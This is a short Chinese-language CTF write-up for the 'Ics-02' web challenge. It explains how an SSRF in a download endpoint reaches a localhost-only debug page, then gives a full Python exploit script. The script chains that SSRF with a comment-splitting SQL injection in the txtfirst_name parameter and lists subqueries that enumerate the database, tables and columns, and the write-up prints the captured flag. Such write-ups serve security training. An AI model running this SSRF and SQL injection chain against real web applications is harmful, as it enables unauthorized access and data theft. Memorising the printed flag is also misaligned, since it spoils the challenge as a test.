# Ics-02

> 打开网页,发现提示可以下载一个文档,说是有帮助,下载后是一个pdf文件,内容是关于ssrf漏洞的.扫目录,发现存在/secret目录,打开后发现存在2个文件,secret.php可以直接访问,访问secret_debug.php显示You (xx.xx.xx.xx) do not have access to this page...联想到之前的ssrf考点,看来是要以ssrf漏洞去访问这个文件了.

> 访问secret.php,随便点击选项,一直往下,到secret.php?s=3这个页面时,发现txtfirst_name参数存在sql注入.需要注意的直接请求url会导致第一个&符号处被加上.pdf导致其余参数无法传入debug文件里面,所以这里要给特殊字符url编码一次再请求,apache服务器就会自动解密一次,这样.pdf就会加在最后一个参数后面了.

## payload

```
import random
import urllib
import requests

url = 'http://61.147.171.105:54754/download.php'

# subquery = "database()"
# ssrfw
# subquery = "select table_name from information_schema.tables where table_schema='ssrfw' LIMIT 1"
# cetcYssrf
# subquery = "select column_name from information_schema.columns where table_name='cetcYssrf' LIMIT 1"
# secretname -> flag
# subquery = "select column_name from information_schema.columns where table_name='cetcYssrf' LIMIT 1, 1"
# value -> flag{cpg9ssnu_OOOOe333eetc_2018}
subquery = "select value from cetcYssrf LIMIT 1"

id = random.randint(1, 10000000)

d = ('http://127.0.0.1/secret/secret_debug.php?' +
        urllib.parse.urlencode({
            "s": "3",
            "txtfirst_name": "L','1',(" + subquery + "),'1'/*",
            "txtmiddle_name": "m",
            "txtLast_name": "y",
            "txtname_suffix": "Esq.",
            "txtdob": "*/,'01/10/2019",
            "txtdl_nmbr": id,
            "txtRetypeDL": id,
	   		"btnContinue2":"Continue"
            }) 
)

r = requests.get(url, params={"dl": d})
print(r.text)
```

## flag

> flag{cpg9ssnu_OOOOe333eetc_2018}